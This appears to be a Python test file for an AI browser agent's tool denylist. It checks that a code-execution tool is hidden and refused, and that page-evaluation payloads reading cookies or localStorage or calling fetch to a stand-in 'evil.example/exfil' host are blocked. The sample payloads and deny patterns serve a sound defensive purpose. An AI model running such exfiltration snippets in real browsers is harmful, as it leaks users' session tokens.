"""Focused tests for MCP tool exposure denylist.

Verifies:
  1) ``browser_run_code`` is filtered out of discovered tools (never
     advertised to the model).
  2) ``browser_run_code`` is rejected at the ``_mcp_call`` boundary
     even if the model fabricates the name.
  3) ``browser_run_code`` is rejected at the ``_build_mcp_args`` flat-arg
     path with a structured error.
  4) ``browser_evaluate`` payloads containing exfil primitives
     (cookies, storage, fetch, etc.) are refused.
  5) Safe ``browser_evaluate`` payloads are allowed through.
  6) Discovery filter logs a warning when dropping denylisted tools.
  7) The ``BROWSER_RUN_CODE`` ActionType enum value does NOT exist.
"""

from __future__ import annotations

import asyncio
import unittest

from backend.agent.playwright_mcp_client import (
    _DISALLOWED_MCP_TOOLS,
    _EVALUATE_JS_DENY_PATTERNS,
    _build_mcp_args,
    _filter_discovered_tools,
    _is_evaluate_js_safe,
    _mcp_call,
)
from backend.models import ActionType


class TestToolDiscoveryDenylist(unittest.TestCase):
    """Discovered tool list must not include denylisted tools."""

    def test_browser_run_code_in_denylist(self):
        self.assertIn("browser_run_code", _DISALLOWED_MCP_TOOLS)

    def test_filter_drops_browser_run_code(self):
        raw = [
            {"name": "browser_click", "description": "click", "inputSchema": {}},
            {"name": "browser_run_code", "description": "exec", "inputSchema": {}},
            {"name": "browser_snapshot", "description": "snap", "inputSchema": {}},
        ]
        filtered = _filter_discovered_tools(raw)
        names = {t["name"] for t in filtered}
        self.assertNotIn("browser_run_code", names)
        self.assertEqual(names, {"browser_click", "browser_snapshot"})

    def test_filter_logs_warning_on_drop(self):
        raw = [{"name": "browser_run_code", "description": "exec", "inputSchema": {}}]
        with self.assertLogs("backend.agent.playwright_mcp_client", level="WARNING") as cm:
            _filter_discovered_tools(raw)
        self.assertTrue(any("browser_run_code" in m for m in cm.output))

    def test_filter_passthrough_when_no_denylisted(self):
        raw = [
            {"name": "browser_click", "description": "", "inputSchema": {}},
            {"name": "browser_evaluate", "description": "", "inputSchema": {}},
        ]
        filtered = _filter_discovered_tools(raw)
        self.assertEqual(len(filtered), 2)


class TestActionTypeEnumExclusion(unittest.TestCase):
    """The BROWSER_RUN_CODE enum must not exist on ActionType."""

    def test_browser_run_code_not_in_actiontype(self):
        with self.assertRaises(AttributeError):
            _ = ActionType.BROWSER_RUN_CODE  # type: ignore[attr-defined]
        values = {a.value for a in ActionType}
        self.assertNotIn("browser_run_code", values)


class TestMcpCallBoundaryRejection(unittest.IsolatedAsyncioTestCase):
    """_mcp_call must refuse browser_run_code regardless of source."""

    async def test_browser_run_code_rejected_at_boundary(self):
        result = await _mcp_call("browser_run_code", {"code": "process.exit(1)"})
        self.assertFalse(result.get("success", True))
        self.assertIn("disabled", result.get("message", "").lower())

    async def test_browser_run_code_rejected_with_empty_args(self):
        result = await _mcp_call("browser_run_code", {})
        self.assertFalse(result.get("success", True))


class TestBuildArgsRejection(unittest.IsolatedAsyncioTestCase):
    """_build_mcp_args returns a structured error for browser_run_code."""

    async def test_build_args_rejects_browser_run_code(self):
        args = await _build_mcp_args("browser_run_code", target="", text="alert(1)")
        self.assertIn("_error", args)
        self.assertIn("disabled", args["_error"].lower())


class TestEvaluateJsDenylist(unittest.TestCase):
    """browser_evaluate denylist blocks exfil primitives."""

    def test_denylist_patterns_present(self):
        # Sanity: the most critical exfil tokens are covered.
        for token in ("document.cookie", "localStorage", "fetch(", "XMLHttpRequest"):
            self.assertIn(token, _EVALUATE_JS_DENY_PATTERNS)

    def test_blocks_document_cookie(self):
        ok, reason = _is_evaluate_js_safe("() => document.cookie")
        self.assertFalse(ok)
        self.assertIn("document.cookie", reason)

    def test_blocks_local_storage(self):
        ok, _ = _is_evaluate_js_safe("() => localStorage.getItem('x')")
        self.assertFalse(ok)

    def test_blocks_fetch(self):
        ok, _ = _is_evaluate_js_safe("() => fetch('https://evil.example/exfil')")
        self.assertFalse(ok)

    def test_blocks_case_insensitive(self):
        ok, _ = _is_evaluate_js_safe("() => DOCUMENT.COOKIE")
        self.assertFalse(ok)

    def test_allows_safe_payload(self):
        ok, reason = _is_evaluate_js_safe("() => document.title")
        self.assertTrue(ok)
        self.assertEqual(reason, "")

    def test_allows_empty_payload(self):
        ok, _ = _is_evaluate_js_safe("")
        self.assertTrue(ok)

    def test_build_args_rejects_unsafe_evaluate(self):
        args = asyncio.run(_build_mcp_args(
            "browser_evaluate",
            target="",
            text="() => document.cookie",
        ))
        self.assertIn("_error", args)
        self.assertIn("disallowed", args["_error"].lower())

    def test_build_args_wraps_safe_evaluate(self):
        args = asyncio.run(_build_mcp_args("browser_evaluate", target="", text="document.title"))
        self.assertNotIn("_error", args)
        self.assertIn("function", args)
        # Bare expressions are auto-wrapped in an arrow fn.
        self.assertTrue(args["function"].startswith("("))


class TestEvaluateBoundaryRejection(unittest.IsolatedAsyncioTestCase):
    """_mcp_call must refuse unsafe browser_evaluate payloads from direct path."""

    async def test_direct_passthrough_function_blocked(self):
        result = await _mcp_call(
            "browser_evaluate",
            {"function": "() => document.cookie"},
        )
        self.assertFalse(result.get("success", True))
        self.assertIn("disallowed", result.get("message", "").lower())

    async def test_direct_passthrough_expression_blocked(self):
        result = await _mcp_call(
            "browser_evaluate",
            {"expression": "localStorage.getItem('token')"},
        )
        self.assertFalse(result.get("success", True))


if __name__ == "__main__":
    unittest.main()
